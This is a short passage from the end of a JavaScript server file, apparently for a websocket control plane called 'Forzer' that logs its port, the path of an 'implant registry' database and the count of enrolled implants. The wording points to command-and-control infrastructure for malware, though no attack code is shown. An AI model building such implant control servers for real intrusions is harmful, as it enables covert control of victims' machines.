  console.log(`Forzer control plane (ws) listening on :${PORT}`);
  console.log(`[db] implant registry: ${process.env.FORZER_DB || store.DEFAULT_DB}`);
  console.log(`[id] ${registry.list().length} implant(s) enrolled`);
});
